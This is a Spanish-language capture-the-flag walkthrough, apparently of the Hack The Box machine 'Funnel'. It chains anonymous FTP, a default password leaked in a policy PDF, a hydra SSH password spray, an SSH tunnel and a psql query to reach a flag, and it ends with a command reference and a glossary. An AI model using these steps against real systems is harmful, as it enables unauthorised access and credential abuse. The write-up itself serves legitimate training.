// 01

FTP y filtración

1
RECONOCIMIENTO
NMAP
$ sudo nmap -sS -p- -n -Pn --min-rate 3000 --max-retries 1 --open 10.129.228.195
21/tcp open ftp
22/tcp open ssh

// NOTA

Sin puerto web: con solo FTP y SSH abiertos, el primer sitio a mirar es siempre el FTP, por si acepta acceso anónimo.

2
EXPLORAR EL FTP ANÓNIMO
FTP
$ curl -s --user anonymous:anonymous ftp://10.129.228.195/mail_backup/
$ curl -s -O --user anonymous:anonymous 'ftp://10.129.228.195/mail_backup/welcome_28112022'
password_policy.pdf welcome_28112022
To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
3
LA CONTRASEÑA POR DEFECTO, EN EL PROPIO PDF
PDFTOTEXT
$ pdftotext password_policy.pdf - | grep -i default
... the default password of "funnel123#!#" must be changed immediately.

// FILTRACIÓN POR DOCUMENTOS INTERNOS

Dónde: un FTP anónimo que expone correos y documentación interna.
Qué permite: el correo de bienvenida da cinco usuarios reales y el PDF de política de contraseñas publica, sin querer, la contraseña por defecto que se supone deben cambiar.

// 02

Password spray SSH

4
PROBAR LA MISMA CONTRASEÑA EN LOS CINCO USUARIOS
HYDRA
$ printf 'optimus\nalbert\nandreas\nchristine\nmaria\n' > users.txt
$ hydra -L users.txt -p 'funnel123#!#' ssh://10.129.228.195 -t 4
[22][ssh] host: 10.129.228.195 login: christine password: funnel123#!#

// NOTA: SPRAY, NO FUERZA BRUTA

Es password spraying: una sola contraseña contra varios usuarios, no un diccionario grande contra uno solo. De los cinco, solo christine nunca cambió la contraseña inicial.

// 03

Túnel y PostgreSQL

5
VER QUÉ ESCUCHA SOLO EN LOCALHOST
SSH
$ sshpass -p 'funnel123#!#' ssh christine@10.129.228.195 'ss -tlnp'
LISTEN 0.0.0.0:21
LISTEN 0.0.0.0:22
LISTEN 127.0.0.1:5432 # PostgreSQL, solo local
6
TUNELIZAR EL 5432
SSH TUNNEL
$ setsid sshpass -p 'funnel123#!#' ssh -N -L 5432:127.0.0.1:5432 christine@10.129.228.195 &
7
LEER LA FLAG EN LA BASE DE DATOS
PSQL
$ export PGPASSWORD='funnel123#!#'
$ psql -h 127.0.0.1 -p 5432 -U christine -d secrets -c 'select * from flag;'
[flag oculta]

// FLAG

[flag oculta] — en la tabla flag de la base secrets. Esta instancia no tiene user.txt/root.txt en disco: es la única flag del reto. Ruta completa: FTP anónimo → usuarios + contraseña por defecto → hydra (christine) → túnel SSH → PostgreSQL → flag. Tiempo total: breve, sin pasos de escalada.

// 04

Referencia Comandos

curl ftp://
curl --user usuario:pass ftp://IP/ruta
Navega y descarga de un servidor FTP sin necesitar el cliente interactivo.
pdftotext
pdftotext archivo.pdf -
Extrae el texto de un PDF a la salida estándar, útil para buscar credenciales filtradas en documentos (paquete poppler-utils).
hydra -L / -p
hydra -L usuarios.txt -p 'contraseña' ssh://IP -t 4
Prueba una única contraseña contra una lista de usuarios (password spray), al revés que una fuerza bruta clásica.
ss -tlnp
ss -tlnp
Lista los sockets TCP en escucha y en qué dirección (0.0.0.0 vs 127.0.0.1), clave para detectar servicios internos.
ssh -L (túnel local)
ssh -N -L puerto_local:127.0.0.1:puerto_remoto usuario@IP
Reenvía un puerto solo accesible en localhost de la víctima hacia la máquina del atacante, a través del túnel SSH.
psql
psql -h host -p puerto -U usuario -d base -c 'SQL'
Cliente de PostgreSQL; con PGPASSWORD exportada evita que pida la contraseña de forma interactiva.

// 05

Glosario

Password spraying
Técnica que prueba una o pocas contraseñas comunes contra muchos usuarios, en vez de muchas contraseñas contra un solo usuario. Es más silenciosa frente a bloqueos por intentos fallidos.
FTP anónimo
Configuración que permite iniciar sesión FTP sin credenciales reales. A menudo deja al descubierto backups, documentos internos o correos olvidados.
Túnel SSH (port forwarding local)
Uso de una conexión SSH para reenviar un puerto que solo escucha en localhost de la víctima hacia la máquina del atacante, sin exponerlo en la red.
Servicio ligado a localhost (127.0.0.1)
Un servicio que solo acepta conexiones desde la propia máquina. No es inaccesible por completo: cualquiera con una shell o un túnel en esa máquina sí puede llegar a él.
PostgreSQL
Sistema de gestión de bases de datos relacional de código abierto. Su cliente estándar es psql, y su puerto por defecto es el 5432.
